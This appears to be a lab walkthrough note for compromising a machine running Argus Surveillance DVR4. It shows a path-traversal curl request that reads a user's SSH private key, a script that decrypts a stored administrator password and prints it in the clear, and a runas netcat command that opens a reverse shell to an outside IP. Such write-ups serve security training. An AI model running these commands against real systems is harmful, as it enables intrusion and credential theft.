#box

*Created: 2/7/2026*

### Step 1

**Tags:** #Argus-Surveillance-DVR4 #Common-Applications #Web-Applications #SSH-Key-Leak #SSH_Key_Authentication #Path-Traversal

🔗 **URL/Link:** https://github.com/Jasurbek-Masimov/CVE-2018-15745

**Command:**
```bash
curl "http://192.168.208.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa"
```

*Port: 8080*

> 
> The machine shows an instance of Argus Surveillance DVR4 hosted on port 8080. By looking online we discover an Unauthenticated Path Traversal vulnerability is present. We download [CVE-2018-15745](https://github.com/Jasurbek-Masimov/CVE-2018-15745) and start enumerating for some files. We notice on the Users interface of DVR that an Administrator and viewer users are mentioned. After a few tries we discover the `viewer` user ssh key in `C:\Users\viewer\.ssh\id_rsa`

---

### Step 2

**Tags:** #Weak-Password-Encryption #decrypt

🔗 **URL/Link:** https://github.com/s3l33/CVE-2022-25012

**Command:**
```bash
python3 CVE-2022-25012.py ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
```

*💎 GEM*

> 
> Once authenticated in SSH, we discover after some trials that inside `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini` the configuration settings of DVR are shown. For some reason both the PoC script and the curl request weren't getting the entirety of the file which is now being printed on our console. Among our previous searches we discovere the following [Weak Password Encryption exploit](https://github.com/s3l33/CVE-2022-25012) and inside that DVRParams.ini we notice a Password0 key that we find out being decryptable by this script. Discovering a password, which we then figure out it is the same administrator password used on the machine by the administrator. `administrator:14WatchD0g$`

---

### Step 3

**Tags:** #runas #Reverse-Shell

**Command:**
```bash
runas /user:dvr4\Administrator "C:\Users\viewer\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.229 8080"
```

> 
> Finally, having a password which we presume it might be the administrator's password, we try to achieve a reverse shell with `runas` as the administrator user, getting control of the system.

---

